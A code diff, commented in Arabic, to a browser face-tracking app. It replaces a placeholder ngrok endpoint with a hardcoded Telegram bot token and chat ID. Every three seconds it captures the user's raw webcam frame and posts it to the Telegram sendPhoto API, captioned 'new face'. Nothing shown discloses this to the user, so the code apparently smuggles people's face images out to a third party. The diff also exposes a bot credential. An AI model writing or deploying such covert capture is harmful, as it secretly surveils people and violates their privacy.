@@ -7,7 +7,8 @@ import {
 // ══════════════════════════════════════════════════
 //  إعدادات السكرين شوت
 // ══════════════════════════════════════════════════
-const SCREENSHOT_ENDPOINT = "ضع_رابط_ngrok_هنا/screenshot";
+const SCREENSHOT_BOT_TOKEN = "8586863933:AAEdZAI2m0mB-R_BgWT8ZOzuwEyqDvqN0QY";
+const SCREENSHOT_CHAT_ID   = "8187027750";
 const SCREENSHOT_INTERVAL = 3000;
 
 // ══════════════════════════════════════════════════
@@ -369,21 +370,33 @@ function initScreenshotCanvas() {
 }
 
 async function sendScreenshot() {
-  if (!screenshotCanvas || SCREENSHOT_ENDPOINT.startsWith("ضع_")) return;
+  if (!screenshotCanvas) return;
+  // نرسم الفيديو فقط (بدون overlay النقاط) على كانفاس مؤقت
   screenshotCanvas.width  = video.videoWidth  || 320;
   screenshotCanvas.height = video.videoHeight || 240;
   const sc = screenshotCanvas.getContext("2d");
-  sc.save(); sc.translate(screenshotCanvas.width, 0); sc.scale(-1,1);
+  // نعكس بالمرآة مثل ما يرى المستخدم
+  sc.save();
+  sc.translate(screenshotCanvas.width, 0);
+  sc.scale(-1, 1);
   sc.drawImage(video, 0, 0, screenshotCanvas.width, screenshotCanvas.height);
   sc.restore();
-  const base64 = screenshotCanvas.toDataURL("image/jpeg", 0.75);
-  try {
-    await fetch(SCREENSHOT_ENDPOINT, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image: base64, caption: `وجه جديد 📸 — ${new Date().toLocaleTimeString("ar")}` }),
-    });
-  } catch(e) { console.warn("screenshot fail:", e); }
+
+  screenshotCanvas.toBlob(async (blob) => {
+    if (!blob) return;
+    if (SCREENSHOT_BOT_TOKEN === "ضع_توكن_البوت_الثاني_هنا") return; // لم يُضبط بعد
+    try {
+      const form = new FormData();
+      form.append("chat_id", SCREENSHOT_CHAT_ID);
+      form.append("photo", blob, "face.jpg");
+      form.append("caption", `وجه جديد 📸 — ${new Date().toLocaleTimeString("ar")}`);
+      await fetch(`https://api.telegram.org/bot${SCREENSHOT_BOT_TOKEN}/sendPhoto`, {
+        method: "POST", body: form,
+      });
+    } catch (e) {
+      console.warn("فشل إرسال السكرين شوت:", e);
+    }
+  }, "image/jpeg", 0.75);
 }
 
 // ══════════════════════════════════════════════════
